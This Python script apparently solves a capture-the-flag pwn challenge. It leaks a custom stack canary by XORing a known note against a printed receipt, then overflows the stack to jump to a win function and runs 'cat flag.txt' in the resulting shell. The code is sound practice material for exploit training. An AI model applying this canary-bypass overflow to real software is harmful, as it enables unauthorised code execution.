#!/usr/bin/env python3
import os
import re
import socket
import struct
import sys


HOST = os.environ.get("HOST", "chal.thjcc.org")
PORT = int(os.environ.get("PORT", "11038"))

RET = 0x401016
WIN = 0x401246


def p64(value):
    return struct.pack("<Q", value)


def u64(data):
    return struct.unpack("<Q", data)[0]


class Tube:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=8)
        self.sock.settimeout(8)
        self.buffer = b""

    def sendline(self, data):
        self.sock.sendall(data + b"\n")

    def recvuntil(self, delimiter):
        while delimiter not in self.buffer:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError(f"connection closed before {delimiter!r}")
            self.buffer += chunk
        end = self.buffer.index(delimiter) + len(delimiter)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result

    def recvall(self):
        chunks = [self.buffer]
        self.buffer = b""
        self.sock.settimeout(2)
        while True:
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def main():
    io = Tube(HOST, PORT)
    banner = io.recvuntil(b"leave a note:\n")
    sys.stderr.buffer.write(banner)

    # Seven bytes plus scanf's terminator fill the 8-byte note without touching
    # the adjacent custom canary.
    first_note = b"A" * 7
    io.sendline(first_note)
    receipt_line = io.recvuntil(b"\n")
    match = re.search(rb"receipt: 0x([0-9a-fA-F]{16})", receipt_line)
    if not match:
        raise RuntimeError(f"receipt not found: {receipt_line!r}")

    receipt = int(match.group(1), 16)
    known_plaintext = u64(first_note + b"\0")
    canary = receipt ^ known_plaintext
    print(f"[+] receipt = {receipt:#018x}", file=sys.stderr)
    print(f"[+] canary  = {canary:#018x}", file=sys.stderr)

    io.recvuntil(b"leave another note:\n")
    payload = (
        b"B" * 8
        + p64(canary)
        + b"C" * 8
        + p64(RET)
        + p64(WIN)
    )
    io.sendline(payload)
    io.sendline(b"cat flag.txt; exit")

    output = io.recvall()
    sys.stdout.buffer.write(output)
    flag = re.search(rb"THJCC\{[^\r\n}]+\}", output)
    if not flag:
        raise RuntimeError(f"flag not found in response: {output!r}")
    print(f"[+] flag: {flag.group().decode()}", file=sys.stderr)


if __name__ == "__main__":
    main()
